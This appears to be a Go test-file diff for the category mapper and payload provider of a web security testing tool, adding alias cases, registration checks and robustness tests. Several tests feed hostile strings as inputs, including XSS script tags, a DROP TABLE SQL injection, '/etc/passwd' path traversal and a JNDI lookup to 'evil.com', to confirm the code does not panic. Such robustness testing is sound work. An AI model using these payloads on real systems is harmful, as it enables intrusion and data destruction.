@@ -2,6 +2,7 @@ package payloadprovider_test
 
 import (
 	"encoding/json"
+	"fmt"
 	"os"
 	"path/filepath"
 	"sort"
@@ -467,6 +468,9 @@ func TestCategoryMapper_Resolve(t *testing.T) {
 		{"alias ldap", "ldap", "LDAP-Injection"},
 		{"alias xpath", "xpath", "XPath-Injection"},
 		{"alias bypass", "bypass", "WAF-Bypass"},
+		{"alias redirect", "redirect", "Open-Redirect"},
+		{"alias open-redirect", "open-redirect", "Open-Redirect"},
+		{"alias polyglot", "polyglot", "Polyglot"},
 		{"unknown remains as-is", "unknown-thing", "unknown-thing"},
 		{"case insensitive alias", "SQLI", "SQL-Injection"},
 	}
@@ -848,5 +852,315 @@ http:
 	// No tags = no matching categories = 0 added
 	if added != 0 {
 		t.Errorf("expected 0 added for template with no tags, got %d", added)
+	}
+}
+
+// ── Wiring tests — verify real payloads directory ─────────────────────────
+
+// TestAllJSONCategories_HaveMapperRegistrations loads the real payloads/
+// directory and verifies every category used in JSON files is registered
+// in the CategoryMapper (i.e., Resolve returns a canonical name, not the
+// raw input as fallback).
+func TestAllJSONCategories_HaveMapperRegistrations(t *testing.T) {
+	payloadDir := filepath.Join("..", "..", "payloads")
+	if _, err := os.Stat(payloadDir); os.IsNotExist(err) {
+		t.Skip("payloads directory not found (running outside repo root)")
+	}
+
+	p := payloadprovider.NewProvider(payloadDir, "")
+	all, err := p.GetAll()
+	if err != nil {
+		t.Fatalf("GetAll: %v", err)
+	}
+	if len(all) == 0 {
+		t.Fatal("no payloads loaded from real payloads directory")
+	}
+
+	mapper := payloadprovider.NewCategoryMapper()
+	allRegistered := mapper.AllCategories()
+	registeredSet := make(map[string]bool, len(allRegistered))
+	for _, c := range allRegistered {
+		registeredSet[strings.ToLower(c)] = true
+	}
+
+	// Collect unique categories from loaded payloads.
+	seen := make(map[string]bool)
+	var unregistered []string
+	for _, up := range all {
+		cat := strings.ToLower(up.Category)
+		if cat == "" || seen[cat] {
+			continue
+		}
+		seen[cat] = true
+
+		// Check if this category resolves to a registered canonical name
+		// (not just a pass-through of the raw input).
+		resolved := mapper.Resolve(cat)
+		if len(resolved) == 1 && strings.ToLower(resolved[0]) == cat && !registeredSet[cat] {
+			unregistered = append(unregistered, cat)
+		}
+	}
+
+	if len(unregistered) > 0 {
+		t.Errorf("JSON payloads use categories not registered in CategoryMapper: %v\n"+
+			"Add registrations in mapper.go for these categories", unregistered)
+	}
+
+	t.Logf("Verified %d categories across %d payloads — all registered", len(seen), len(all))
+}
+
+// ── Negative / adversarial tests ──────────────────────────────────────────
+
+func TestCategoryMapper_Resolve_AdversarialInputs(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+
+	// None of these should panic, and all should return the input unchanged
+	// (or resolved to a canonical name if an alias happens to match).
+	adversarial := []string{
+		"<script>alert(1)</script>",
+		"'; DROP TABLE categories;--",
+		"../../etc/passwd",
+		"null",
+		"\x00",
+		"\x00sqli",
+		"sqli\x00",
+		strings.Repeat("a", 10000),
+		"   ",
+		"\t\n\r",
+		"sql injection' OR '1'='1",
+		"{{.Category}}",
+		"${jndi:ldap://evil.com}",
+		"%(category)s",
+		"sqli\nssti",
+		"XSS\r\nInjection",
+	}
+
+	for _, input := range adversarial {
+		name := fmt.Sprintf("len=%d", len(input))
+		if len(input) < 80 {
+			name = input
+		}
+		t.Run(name, func(t *testing.T) {
+			got := m.Resolve(input)
+			if len(got) == 0 {
+				t.Errorf("Resolve(%q) returned empty slice, want at least passthrough", input)
+			}
+		})
+	}
+}
+
+func TestCategoryMapper_CategoriesToTags_AdversarialInputs(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+
+	// All should return nil (no matching tags) without panicking.
+	adversarial := []string{
+		"<script>alert(1)</script>",
+		"'; DROP TABLE categories;--",
+		"\x00",
+		strings.Repeat("x", 10000),
+		"   ",
+	}
+
+	for _, input := range adversarial {
+		name := fmt.Sprintf("len=%d", len(input))
+		if len(input) < 80 {
+			name = input
+		}
+		t.Run(name, func(t *testing.T) {
+			got := m.CategoriesToTags(input)
+			if got != nil {
+				t.Errorf("CategoriesToTags(%q) = %v, want nil for unrecognized input", input, got)
+			}
+		})
+	}
+}
+
+func TestCategoryMapper_TagsToCategories_AdversarialInputs(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+
+	tests := []struct {
+		name string
+		tags []string
+	}{
+		{"nil tags", nil},
+		{"empty slice", []string{}},
+		{"single empty string", []string{""}},
+		{"multiple empty strings", []string{"", "", ""}},
+		{"null bytes", []string{"\x00", "\x00\x00"}},
+		{"very long tag", []string{strings.Repeat("z", 10000)}},
+		{"mixed valid and adversarial", []string{"sqli", "<script>", "\x00", strings.Repeat("y", 5000)}},
+		{"injection attempt", []string{"'; DROP TABLE--", "${jndi:ldap://evil}"}},
+		{"whitespace only", []string{" ", "\t", "\n", "\r\n"}},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// Must not panic
+			got := m.TagsToCategories(tt.tags)
+
+			// If mixed with valid tag "sqli", should still resolve that one.
+			if tt.name == "mixed valid and adversarial" {
+				found := false
+				for _, cat := range got {
+					if cat == "SQL-Injection" {
+						found = true
+						break
+					}
+				}
+				if !found {
+					t.Error("mixed valid+adversarial should still resolve 'sqli' → SQL-Injection")
+				}
+			}
+		})
+	}
+}
+
+func TestShortNames_Invariants(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+	names := m.ShortNames()
+
+	if len(names) == 0 {
+		t.Fatal("ShortNames returned empty slice")
+	}
+
+	// No duplicates
+	seen := make(map[string]bool, len(names))
+	for _, n := range names {
+		if seen[n] {
+			t.Errorf("ShortNames has duplicate: %q", n)
+		}
+		seen[n] = true
+	}
+
+	// No empty strings
+	for _, n := range names {
+		if n == "" {
+			t.Error("ShortNames contains empty string")
+		}
+		if strings.TrimSpace(n) == "" {
+			t.Errorf("ShortNames contains whitespace-only entry: %q", n)
+		}
+	}
+
+	// All lowercase (short names should be user-friendly lowercase identifiers)
+	for _, n := range names {
+		if n != strings.ToLower(n) {
+			t.Errorf("ShortNames entry %q is not lowercase", n)
+		}
+	}
+
+	// Sorted (contract: sorted alphabetically for deterministic output)
+	if !sort.StringsAreSorted(names) {
+		t.Errorf("ShortNames not sorted: %v", names)
+	}
+
+	// Each short name should round-trip through Resolve
+	for _, n := range names {
+		resolved := m.Resolve(n)
+		if len(resolved) == 0 {
+			t.Errorf("ShortNames entry %q does not resolve", n)
+		}
+	}
+}
+
+func TestValidCategories_Invariants(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+	valid := m.ValidCategories()
+
+	if len(valid) == 0 {
+		t.Fatal("ValidCategories returned empty map")
+	}
+
+	// No empty keys
+	if valid[""] {
+		t.Error("ValidCategories contains empty string key")
+	}
+
+	// All keys should be lowercase (case-insensitive lookup)
+	for key := range valid {
+		if key != strings.ToLower(key) {
+			t.Errorf("ValidCategories key %q is not lowercase", key)
+		}
+	}
+
+	// Every ShortName should be in ValidCategories
+	shortNames := m.ShortNames()
+	for _, sn := range shortNames {
+		if !valid[sn] {
+			t.Errorf("ShortName %q not in ValidCategories", sn)
+		}
+	}
+
+	// Every AllCategories canonical name (lowercased) should be in ValidCategories
+	allCats := m.AllCategories()
+	for _, cat := range allCats {
+		if !valid[strings.ToLower(cat)] {
+			t.Errorf("AllCategories entry %q not in ValidCategories", cat)
+		}
+	}
+}
+
+func TestAllCategories_Invariants(t *testing.T) {
+	m := payloadprovider.NewCategoryMapper()
+	cats := m.AllCategories()
+
+	if len(cats) == 0 {
+		t.Fatal("AllCategories returned empty slice")
+	}
+
+	// No duplicates
+	seen := make(map[string]bool, len(cats))
+	for _, c := range cats {
+		lower := strings.ToLower(c)
+		if seen[lower] {
+			t.Errorf("AllCategories has duplicate (case-insensitive): %q", c)
+		}
+		seen[lower] = true
+	}
+
+	// No empty strings
+	for _, c := range cats {
+		if c == "" {
+			t.Error("AllCategories contains empty string")
+		}
+	}
+
+	// Each category should produce at least one tag via CategoriesToTags
+	for _, c := range cats {
+		tags := m.CategoriesToTags(c)
+		if len(tags) == 0 {
+			t.Errorf("AllCategories entry %q has no associated tags", c)
+		}
+	}
+}
+
+func TestGetByCategory_AdversarialInputs(t *testing.T) {
+	payloadDir, nucleiDir := setupFixtures(t)
+	p := payloadprovider.NewProvider(payloadDir, nucleiDir)
+
+	adversarial := []string{
+		"<script>alert(1)</script>",
+		"'; DROP TABLE categories;--",
+		"\x00",
+		strings.Repeat("a", 10000),
+		"   ",
+		"../../../etc/passwd",
+		"${jndi:ldap://evil.com}",
+	}
+
+	for _, input := range adversarial {
+		name := fmt.Sprintf("len=%d", len(input))
+		if len(input) < 80 {
+			name = input
+		}
+		t.Run(name, func(t *testing.T) {
+			results, err := p.GetByCategory(input)
+			if err != nil {
+				t.Fatalf("GetByCategory(%q) errored: %v", input, err)
+			}
+			if len(results) != 0 {
+				t.Errorf("GetByCategory(%q) returned %d results, want 0", input, len(results))
+			}
+		})
 	}
 }
